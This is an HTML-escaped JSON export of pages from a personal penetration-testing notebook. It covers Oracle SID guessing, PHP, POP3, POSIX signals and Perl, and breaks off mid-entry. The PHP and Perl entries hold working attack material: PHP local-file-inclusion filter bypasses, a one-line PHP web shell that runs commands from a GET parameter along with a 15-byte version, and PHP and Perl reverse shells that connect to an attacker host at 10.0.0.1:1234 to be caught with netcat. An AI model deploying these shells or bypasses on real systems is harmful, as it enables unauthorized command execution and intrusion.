data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sidguess&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -i&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $IP_ADDRESS&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -d&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $WORDLIST_FILE&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;More information about the above tools:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=&quot;https://www.kali.org/tools/tnscmd10g/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;tnscmd10g&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://www.kali.org/tools/oscanner/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;oscanner&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://www.kali.org/tools/sidguesser/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;sidguesser&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;"},"spells/PHP-local-file-inclusion-attacks":{"slug":"spells/PHP-local-file-inclusion-attacks","filePath":"spells/PHP local file inclusion attacks.md","title":"PHP local file inclusion attacks","links":["spells/PHP","spells/Poison-null-byte-attack","spells/Local-file-inclusion-attacks"],"tags":["AttackCycle/Exploitation/LocalFileInclusion","Language/PHP","OS/Linux/Distros/Kali","AttackCycle/Exploitation/NullByteAttacks"],"content":"For PHP &lt; 5.3.4, you can use the poison null byte to defeat simple path filters or situations where the developer is appending some suffix to user input to try to prevent local file inclusion attacks.\nIf the poison null byte doesn’t work, another trick relies on the fact that for some bizarre reason PHP allows files to be referenced with . notation just like directories. In other words, /etc/passwd/. will return the contents of /etc/passwd!\nRepresenting ../ as ....// can bypass filters that replace ../, as PHP search-and-replace only does a single pass through a string (it should be obvious how to extend this if a developer tries to just run a search and replace twice).\nRCE\n&lt;?php\n\techo &quot;&lt;pre&gt;&quot; . shell_exec($_GET[&quot;cmd&quot;]) . &quot;&lt;/pre&gt;&quot;;\n?&gt;\nA slightly spruced-up version of this is available on Kali Linux as /usr/share/webshells/php/simple-backdoor.php.\nOn space-constrained systems, you can compact this down to just 15 bytes:\n&lt;?=`$_GET[1]`?&gt;","richContent":"&lt;p&gt;For &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/PHP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/PHP&quot;&gt;PHP&lt;/a&gt; &amp;#x3C; 5.3.4, you can use &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Poison-null-byte-attack&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Poison-null-byte-attack&quot;&gt;the poison null byte&lt;/a&gt; to defeat simple path filters or situations where the developer is appending some suffix to user input to try to prevent &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Local-file-inclusion-attacks&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Local-file-inclusion-attacks&quot;&gt;local file inclusion attacks&lt;/a&gt;.&lt;/p&gt;\n&lt;p&gt;If the poison null byte doesn’t work, another trick relies on the fact that for some bizarre reason &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/PHP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/PHP&quot;&gt;PHP&lt;/a&gt; allows files to be referenced with &lt;code&gt;.&lt;/code&gt; notation just like directories. In other words, &lt;code&gt;/etc/passwd/.&lt;/code&gt; will return the contents of /etc/passwd!&lt;/p&gt;\n&lt;p&gt;Representing &lt;code&gt;../&lt;/code&gt; as &lt;code&gt;....//&lt;/code&gt; can bypass filters that replace &lt;code&gt;../&lt;/code&gt;, as &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/PHP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/PHP&quot;&gt;PHP&lt;/a&gt; search-and-replace only does a single pass through a string (it should be obvious how to extend this if a developer tries to just run a search and replace &lt;em&gt;twice&lt;/em&gt;).&lt;/p&gt;\n&lt;h2 id=&quot;rce&quot;&gt;RCE&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#rce&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;php&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;php&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;&amp;#x3C;?&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;php&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\techo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;&amp;#x3C;pre&gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; .&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt; shell_exec&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;($&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;_GET&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;cmd&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;])&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; .&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;&amp;#x3C;/pre&gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;A slightly spruced-up version of this is available on Kali Linux as /usr/share/webshells/php/simple-backdoor.php.&lt;/p&gt;\n&lt;p&gt;On space-constrained systems, you can compact this down to just &lt;a href=&quot;https://twitter.com/podalirius_/status/1488921781637365771&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;15 bytes&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;php&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;php&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;&amp;#x3C;?&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;`&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;_GET[1]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;`&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/PHP":{"slug":"spells/PHP","filePath":"spells/PHP.md","title":"PHP","links":["spells/Poison-null-byte-in-PHP","spells/PHP-local-file-inclusion-attacks","spells/RCE-via-XXE-in-PHP","spells/netcat","spells/socat"],"tags":["Language/PHP","AttackCycle/Exploitation","OS/Linux/Distros/Kali","Application/netcat","Application/socat"],"content":"The poison null byte\nTransclude of Poison-null-byte-in-PHP\nLocal file inclusion\nTransclude of PHP-local-file-inclusion-attacks\nRCE via XXE\nTransclude of RCE-via-XXE-in-PHP\nReverse shell\nCheck out /usr/share/webshells/php/php-reverse-shell.php on Kali Linux. Note that this only works on UNIX-like systems.\nAlternately, a very simple shell (suitable for running at the command line):\n$attacker_ip = &quot;10.0.0.1&quot;;\n$attacker_port = 1234;\n \n$sock = fsockopen($attacker_ip, $attacker_port);\n \nexec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);\nCatch it with netcat or socat.","richContent":"&lt;h2 id=&quot;the-poison-null-byte&quot;&gt;The poison null byte&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#the-poison-null-byte&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;Poison-null-byte-in-PHP&quot; data-block=&quot;&quot; data-embed-alias=&quot;Poison null byte in PHP&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Poison-null-byte-in-PHP&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/Poison-null-byte-in-PHP&quot;&gt;Transclude of Poison-null-byte-in-PHP&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=&quot;local-file-inclusion&quot;&gt;Local file inclusion&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#local-file-inclusion&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;PHP-local-file-inclusion-attacks&quot; data-block=&quot;&quot; data-embed-alias=&quot;PHP local file inclusion attacks&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/PHP-local-file-inclusion-attacks&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/PHP-local-file-inclusion-attacks&quot;&gt;Transclude of PHP-local-file-inclusion-attacks&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=&quot;rce-via-xxe&quot;&gt;RCE via XXE&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#rce-via-xxe&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;RCE-via-XXE-in-PHP&quot; data-block=&quot;&quot; data-embed-alias=&quot;RCE via XXE in PHP&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/RCE-via-XXE-in-PHP&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/RCE-via-XXE-in-PHP&quot;&gt;Transclude of RCE-via-XXE-in-PHP&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=&quot;reverse-shell&quot;&gt;Reverse shell&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#reverse-shell&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Check out /usr/share/webshells/php/php-reverse-shell.php on Kali Linux. Note that this only works on UNIX-like systems.&lt;/p&gt;\n&lt;p&gt;Alternately, a &lt;em&gt;very&lt;/em&gt; simple shell (suitable for running at the command line):&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;php&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;php&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;attacker_ip&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;10.0.0.1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;attacker_port&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 1234&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;sock&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt; fsockopen&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;($&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;attacker_ip&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; $&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;attacker_port&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;exec&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;/bin/sh -i &amp;#x3C;&amp;#x26;3 &gt;&amp;#x26;3 2&gt;&amp;#x26;3&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Catch it with &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/netcat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/netcat&quot;&gt;netcat&lt;/a&gt; or &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/socat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/socat&quot;&gt;socat&lt;/a&gt;.&lt;/p&gt;"},"spells/POP3":{"slug":"spells/POP3","filePath":"spells/POP3.md","title":"POP3","links":[],"tags":["Protocol/POP3"],"content":"Post Office Protocol 3 (POP3) commands:\n\nUSER — Username to use for authentication\nPASS — Password to use for authentication\nSTAT — Mailbox statistics (+OK $TOTAL_MSGS $MBOX_SIZE_BYTES)\nLIST — List messages ($MSG_NUMBER $MSG_SIZE_BYTES)\nRETR — Retrieve message $MESSAGE_NUMBER\nQUIT — Close connection\n\nThere are other commands, but the above are enough to pull messages.","richContent":"&lt;p&gt;Post Office Protocol 3 (POP3) commands:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;USER — Username to use for authentication&lt;/li&gt;\n&lt;li&gt;PASS — Password to use for authentication&lt;/li&gt;\n&lt;li&gt;STAT — Mailbox statistics (&lt;code&gt;+OK $TOTAL_MSGS $MBOX_SIZE_BYTES&lt;/code&gt;)&lt;/li&gt;\n&lt;li&gt;LIST — List messages (&lt;code&gt;$MSG_NUMBER $MSG_SIZE_BYTES&lt;/code&gt;)&lt;/li&gt;\n&lt;li&gt;RETR — Retrieve message &lt;code&gt;$MESSAGE_NUMBER&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;QUIT — Close connection&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;There are other commands, but the above are enough to pull messages.&lt;/p&gt;"},"spells/POSIX-process-signals":{"slug":"spells/POSIX-process-signals","filePath":"spells/POSIX process signals.md","title":"POSIX process signals","links":[],"tags":["OS/Linux","OS/AIX","OS/macOS","Standard/POSIX"],"content":"\nSIGTERM — Kill the process, but allow it to do some cleanup tasks beforehand\nSIGKILL — Kill the process (doesn’t do any cleanup after the fact)\nSIGSTOP — Stop/suspend a process\n\nThere are others, but these are the big ones.","richContent":"&lt;ul&gt;\n&lt;li&gt;SIGTERM — Kill the process, but allow it to do some cleanup tasks beforehand&lt;/li&gt;\n&lt;li&gt;SIGKILL — Kill the process (doesn’t do any cleanup after the fact)&lt;/li&gt;\n&lt;li&gt;SIGSTOP — Stop/suspend a process&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;There are others, but these are the big ones.&lt;/p&gt;"},"spells/Perl":{"slug":"spells/Perl","filePath":"spells/Perl.md","title":"Perl","links":["spells/netcat","spells/socat"],"tags":["Language/Perl","AttackCycle/Exploitation","Application/netcat","Application/socat"],"content":"\n\n                  \n                  Note\n                  \n                \n\n\nAdapted from slyth11907 / Cheatsheets / Cheatsheet_ReverseShells.\n\n\n\nA simple reverse shell:\nuse Socket;\n \n$attacker_ip=&quot;10.0.0.1&quot;;\n$attacker_port=1234;\n \nsocket(S, PF_INET, SOCK_STREAM, getprotobyname(&quot;tcp&quot;));\nif(connect(S,sockaddr_in($attacker_port, inet_aton($attacker_ip)))){\n\topen(STDIN, &quot;&gt;&amp;S&quot;);\n\topen(STDOUT, &quot;&gt;&amp;S&quot;);\n\topen(STDERR, &quot;&gt;&amp;S&quot;);\n\texec(&quot;/bin/sh -i&quot;);\n};\nCatch it with netcat or socat.","richContent":"&lt;blockquote class=&quot;callout note&quot; data-callout=&quot;note&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Note&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;Adapted from &lt;a href=&quot;https://github.com/slyth11907/Cheatsheets/blob/master/Cheatsheet_ReverseShells#L11&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;slyth11907 / Cheatsheets / Cheatsheet_ReverseShells&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;A simple reverse shell:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;perl&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;perl&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;use&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; Socket;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;attacker_ip&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;10.0.0.1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;attacker_port&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;=1234;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;socket&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;(S, PF_INET, SOCK_STREAM, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;getprotobyname&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;tcp&lt;/span&gt;&lt;span 